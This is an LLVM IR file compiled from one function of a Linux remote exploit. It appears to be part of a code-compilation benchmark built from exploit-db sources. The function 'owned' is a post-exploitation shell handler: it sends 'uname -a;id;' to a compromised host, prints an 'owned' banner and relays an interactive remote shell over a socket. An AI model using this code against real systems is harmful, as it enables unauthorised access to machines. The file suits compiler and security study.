; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23413.c_owned.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_23413.c_owned.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [15 x i8] c"uname -a;id;\0A\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [63 x i8] c" (======owned======) (======owned======) (======owned======)\0A\0A\00", align 1
@FD_SETSIZE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [23 x i8] c" _(0x333)_  cya hax0r\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [22 x i8] c" _(0x333)_ cya hax0r\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @owned(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [1024 x i8], align 16
  %6 = alloca i8*, align 8
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i8** %6, align 8
  %7 = call i32 @FD_ZERO(i32* %4)
  %8 = load i32, i32* %2, align 4
  %9 = call i32 @FD_SET(i32 %8, i32* %4)
  %10 = call i32 @FD_SET(i32 0, i32* %4)
  %11 = load i32, i32* @stdout, align 4
  %12 = call i32 @fprintf(i32 %11, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.1, i64 0, i64 0))
  %13 = load i32, i32* %2, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = call i32 @strlen(i8* %15)
  %17 = call i32 @send(i32 %13, i8* %14, i32 %16, i32 0)
  br label %18

18:                                               ; preds = %61, %1
  %19 = load i32, i32* %2, align 4
  %20 = call i32 @FD_SET(i32 %19, i32* %4)
  %21 = call i32 @FD_SET(i32 0, i32* %4)
  %22 = load i32, i32* @FD_SETSIZE, align 4
  %23 = call i32 @select(i32 %22, i32* %4, i32* null, i32* null, i32* null)
  %24 = icmp slt i32 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %18
  br label %63

26:                                               ; preds = %18
  %27 = load i32, i32* %2, align 4
  %28 = call i64 @FD_ISSET(i32 %27, i32* %4)
  %29 = icmp ne i64 %28, 0
  br i1 %29, label %30, label %44

30:                                               ; preds = %26
  %31 = load i32, i32* %2, align 4
  %32 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %33 = call i32 @recv(i32 %31, i8* %32, i32 1023, i32 0)
  store i32 %33, i32* %3, align 4
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %37

35:                                               ; preds = %30
  %36 = call i32 @warning(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  br label %37

37:                                               ; preds = %35, %30
  %38 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %39 = load i32, i32* %3, align 4
  %40 = call i32 @write(i32 1, i8* %38, i32 %39)
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %43

42:                                               ; preds = %37
  br label %63

43:                                               ; preds = %37
  br label %44

44:                                               ; preds = %43, %26
  %45 = call i64 @FD_ISSET(i32 0, i32* %4)
  %46 = icmp ne i64 %45, 0
  br i1 %46, label %47, label %61

47:                                               ; preds = %44
  %48 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %49 = call i32 @read(i32 0, i8* %48, i32 1023)
  store i32 %49, i32* %3, align 4
  %50 = icmp slt i32 %49, 0
  br i1 %50, label %51, label %53

51:                                               ; preds = %47
  %52 = call i32 @warning(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  br label %53

53:                                               ; preds = %51, %47
  %54 = load i32, i32* %2, align 4
  %55 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %56 = load i32, i32* %3, align 4
  %57 = call i32 @send(i32 %54, i8* %55, i32 %56, i32 0)
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %53
  br label %63

60:                                               ; preds = %53
  br label %61

61:                                               ; preds = %60, %44
  %62 = call i32 @usleep(i32 10)
  br label %18

63:                                               ; preds = %59, %42, %25
  %64 = load i32, i32* @stderr, align 4
  %65 = call i32 @fprintf(i32 %64, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i32 @warning(i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
